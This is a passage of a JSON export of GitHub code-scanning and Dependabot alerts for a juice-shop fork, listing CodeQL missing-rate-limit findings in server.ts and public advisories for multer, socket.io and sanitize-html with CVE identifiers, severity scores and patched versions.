[express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs authorization, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 635,
          "end_line": 635,
          "start_column": 23,
          "end_column": 58
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/89/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 88,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/88",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/88",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited.\nThis route handler performs a file system access, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 632,
          "end_line": 632,
          "start_column": 21,
          "end_column": 44
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/88/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 87,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/87",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/87",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs a file system access, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 631,
          "end_line": 631,
          "start_column": 25,
          "end_column": 54
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/87/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 86,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/86",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/86",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs a file system access, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 622,
          "end_line": 622,
          "start_column": 90,
          "end_column": 110
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/86/instances",
      "dismissal_approved_by": null
    },
    {
      "number": 85,
      "created_at": "2025-06-11T06:32:19Z",
      "updated_at": "2025-06-11T11:09:38Z",
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/85",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/code-scanning/85",
      "state": "open",
      "fixed_at": null,
      "dismissed_by": null,
      "dismissed_at": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "rule": {
        "id": "js/missing-rate-limiting",
        "severity": "warning",
        "description": "Missing rate limiting",
        "name": "js/missing-rate-limiting",
        "tags": [
          "external/cwe/cwe-307",
          "external/cwe/cwe-400",
          "external/cwe/cwe-770",
          "security"
        ],
        "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
        "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
        "security_severity_level": "high"
      },
      "tool": {
        "name": "CodeQL",
        "guid": null,
        "version": "2.22.0"
      },
      "most_recent_instance": {
        "ref": "refs/heads/master",
        "analysis_key": ".github/workflows/GHAS.yml:code-scanning",
        "environment": "{}",
        "category": ".github/workflows/GHAS.yml:code-scanning",
        "state": "open",
        "commit_sha": "c1dea456b3e8b9015a5d11488bfe5adf2bff7c5a",
        "message": {
          "text": "This route handler performs a file system access, but is not rate-limited."
        },
        "location": {
          "path": "server.ts",
          "start_line": 621,
          "end_line": 621,
          "start_column": 119,
          "end_column": 134
        },
        "classifications": []
      },
      "instances_url": "https://api.github.com/repos/Champmsecurity/juice-shop/code-scanning/alerts/85/instances",
      "dismissal_approved_by": null
    }
  ],
  "secret_scanning": [],
  "dependabot": [
    {
      "number": 16,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "multer"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-g5hg-p3ph-g8qg",
        "cve_id": "CVE-2025-48997",
        "summary": "Multer vulnerable to Denial of Service via unhandled exception",
        "description": "### Impact\n\nA vulnerability in Multer versions >=1.4.4-lts.1, <2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.1`\n\n### Workarounds\n\nNone\n\n### References\n\nhttps://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9\nhttps://github.com/expressjs/multer/issues/1233\nhttps://github.com/expressjs/multer/pull/1256",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-g5hg-p3ph-g8qg",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-48997",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48997"
          },
          {
            "url": "https://github.com/expressjs/multer/issues/1233"
          },
          {
            "url": "https://github.com/expressjs/multer/pull/1256"
          },
          {
            "url": "https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9"
          },
          {
            "url": "https://github.com/advisories/GHSA-g5hg-p3ph-g8qg"
          }
        ],
        "published_at": "2025-06-05T01:09:35Z",
        "updated_at": "2025-06-05T01:09:36Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "multer"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 1.4.4-lts.1, < 2.0.1",
            "first_patched_version": {
              "identifier": "2.0.1"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": null,
            "score": 0.0
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            "score": 8.7
          }
        },
        "epss": {
          "percentage": 0.00055,
          "percentile": 0.17446
        },
        "cvss": {
          "vector_string": null,
          "score": 0.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-248",
            "name": "Uncaught Exception"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "multer"
        },
        "severity": "high",
        "vulnerable_version_range": ">= 1.4.4-lts.1, < 2.0.1",
        "first_patched_version": {
          "identifier": "2.0.1"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/16",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/16",
      "created_at": "2025-06-11T06:30:59Z",
      "updated_at": "2025-06-11T06:30:59Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 15,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "multer"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-4pg4-qvpc-4q3h",
        "cve_id": "CVE-2025-47944",
        "summary": "Multer vulnerable to Denial of Service from maliciously crafted requests",
        "description": "### Impact\nA vulnerability in Multer versions >=1.4.4-lts.1 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed multi-part upload request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\nUsers should upgrade to `2.0.0`\n\n### Workarounds\nNone\n\n### References\n\n- https://github.com/expressjs/multer/issues/1176\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-4pg4-qvpc-4q3h",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-47944",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/expressjs/multer/security/advisories/GHSA-4pg4-qvpc-4q3h"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-47944"
          },
          {
            "url": "https://github.com/expressjs/multer/issues/1176"
          },
          {
            "url": "https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665"
          },
          {
            "url": "https://github.com/advisories/GHSA-4pg4-qvpc-4q3h"
          }
        ],
        "published_at": "2025-05-19T22:16:30Z",
        "updated_at": "2025-05-21T20:37:35Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "multer"
            },
            "severity": "high",
            "vulnerable_version_range": ">= 1.4.4-lts.1, < 2.0.0",
            "first_patched_version": {
              "identifier": "2.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00049,
          "percentile": 0.15354
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-248",
            "name": "Uncaught Exception"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "multer"
        },
        "severity": "high",
        "vulnerable_version_range": ">= 1.4.4-lts.1, < 2.0.0",
        "first_patched_version": {
          "identifier": "2.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/15",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/15",
      "created_at": "2025-06-11T06:30:59Z",
      "updated_at": "2025-06-11T06:30:59Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 14,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "multer"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-44fp-w29j-9vj5",
        "cve_id": "CVE-2025-47935",
        "summary": "Multer vulnerable to Denial of Service via memory leaks from unclosed streams",
        "description": "### Impact\n\nMulter <2.0.0 is vulnerable to a resource exhaustion and memory leak issue due to improper stream handling. When the HTTP request stream emits an error, the internal `busboy` stream is not closed, violating Node.js stream safety guidance.\n\nThis leads to unclosed streams accumulating over time, consuming memory and file descriptors. Under sustained or repeated failure conditions, this can result in denial of service, requiring manual server restarts to recover. All users of Multer handling file uploads are potentially impacted.\n\n\n### Patches\n\nUsers should upgrade to `2.0.0`\n\n\n### Workarounds\n\nNone\n\n### References\n\n- https://github.com/expressjs/multer/pull/1120\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-44fp-w29j-9vj5",
            "type": "GHSA"
          },
          {
            "value": "CVE-2025-47935",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/expressjs/multer/security/advisories/GHSA-44fp-w29j-9vj5"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-47935"
          },
          {
            "url": "https://github.com/expressjs/multer/pull/1120"
          },
          {
            "url": "https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665"
          },
          {
            "url": "https://github.com/advisories/GHSA-44fp-w29j-9vj5"
          }
        ],
        "published_at": "2025-05-19T22:04:17Z",
        "updated_at": "2025-06-08T07:19:19Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "multer"
            },
            "severity": "high",
            "vulnerable_version_range": "< 2.0.0",
            "first_patched_version": {
              "identifier": "2.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00049,
          "percentile": 0.15354
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-401",
            "name": "Missing Release of Memory after Effective Lifetime"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "multer"
        },
        "severity": "high",
        "vulnerable_version_range": "< 2.0.0",
        "first_patched_version": {
          "identifier": "2.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/14",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/14",
      "created_at": "2025-06-11T06:30:59Z",
      "updated_at": "2025-06-11T06:30:59Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 13,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "socket.io"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-25hc-qcg6-38wj",
        "cve_id": "CVE-2024-38355",
        "summary": "socket.io has an unhandled 'error' event",
        "description": "### Impact\n\nA specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.\n\n```\nnode:events:502\n    throw err; // Unhandled 'error' event\n    ^\n\nError [ERR_UNHANDLED_ERROR]: Unhandled error. (undefined)\n    at new NodeError (node:internal/errors:405:5)\n    at Socket.emit (node:events:500:17)\n    at /myapp/node_modules/socket.io/lib/socket.js:531:14\n    at process.processTicksAndRejections (node:internal/process/task_queues:77:11) {\n  code: 'ERR_UNHANDLED_ERROR',\n  context: undefined\n}\n```\n\n### Affected versions\n\n| Version range    | Needs minor update?                            |\n|------------------|------------------------------------------------|\n| `4.6.2...latest` | Nothing to do               |\n| `3.0.0...4.6.1`  | Please upgrade to `socket.io@4.6.2` (at least) |\n| `2.3.0...2.5.0`  | Please upgrade to `socket.io@2.5.1`            |\n\n### Patches\n\nThis issue is fixed by https://github.com/socketio/socket.io/commit/15af22fc22bc6030fcead322c106f07640336115, included in `socket.io@4.6.2` (released in May 2023).\n\nThe fix was backported in the 2.x branch today: https://github.com/socketio/socket.io/commit/d30630ba10562bf987f4d2b42440fc41a828119c\n\n### Workarounds\n\nAs a workaround for the affected versions of the `socket.io` package, you can attach a listener for the \"error\" event:\n\n```js\nio.on(\"connection\", (socket) => {\n  socket.on(\"error\", () => {\n    // ...\n  });\n});\n```\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https://github.com/socketio/socket.io/discussions)\n\nThanks a lot to [Paul Taylor](https://github.com/Y0ursTruly) for the responsible disclosure.\n\n### References\n\n- https://github.com/socketio/socket.io/commit/15af22fc22bc6030fcead322c106f07640336115\n- https://github.com/socketio/socket.io/commit/d30630ba10562bf987f4d2b42440fc41a828119c\n",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-25hc-qcg6-38wj",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-38355",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/socketio/socket.io/security/advisories/GHSA-25hc-qcg6-38wj"
          },
          {
            "url": "https://github.com/socketio/socket.io/commit/15af22fc22bc6030fcead322c106f07640336115"
          },
          {
            "url": "https://github.com/socketio/socket.io/commit/d30630ba10562bf987f4d2b42440fc41a828119c"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-38355"
          },
          {
            "url": "https://github.com/advisories/GHSA-25hc-qcg6-38wj"
          }
        ],
        "published_at": "2024-06-19T15:04:41Z",
        "updated_at": "2024-11-18T16:26:46Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "socket.io"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 2.5.0",
            "first_patched_version": {
              "identifier": "2.5.1"
            }
          },
          {
            "package": {
              "ecosystem": "npm",
              "name": "socket.io"
            },
            "severity": "medium",
            "vulnerable_version_range": ">= 3.0.0, < 4.6.2",
            "first_patched_version": {
              "identifier": "4.6.2"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "score": 7.3
          },
          "cvss_v4": {
            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N",
            "score": 6.9
          }
        },
        "epss": {
          "percentage": 0.00099,
          "percentile": 0.28684
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "score": 7.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-20",
            "name": "Improper Input Validation"
          },
          {
            "cwe_id": "CWE-754",
            "name": "Improper Check for Unusual or Exceptional Conditions"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "socket.io"
        },
        "severity": "medium",
        "vulnerable_version_range": ">= 3.0.0, < 4.6.2",
        "first_patched_version": {
          "identifier": "4.6.2"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/13",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/13",
      "created_at": "2025-06-11T06:30:59Z",
      "updated_at": "2025-06-11T06:30:59Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 12,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-cgfm-xwp7-2cvr",
        "cve_id": "CVE-2022-25887",
        "summary": "Sanitize-html Vulnerable To REDoS Attacks",
        "description": "The package sanitize-html before 2.7.1 are vulnerable to Regular Expression Denial of Service (ReDoS) due to insecure global regular expression replacement logic of HTML comment removal.",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-cgfm-xwp7-2cvr",
            "type": "GHSA"
          },
          {
            "value": "CVE-2022-25887",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25887"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/557"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/b4682c12fd30e12e82fa2d9b766de91d7d2cd23c"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3008102"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JS-SANITIZEHTML-2957526"
          },
          {
            "url": "https://github.com/advisories/GHSA-cgfm-xwp7-2cvr"
          }
        ],
        "published_at": "2022-08-31T00:00:24Z",
        "updated_at": "2024-04-22T23:16:47Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "sanitize-html"
            },
            "severity": "high",
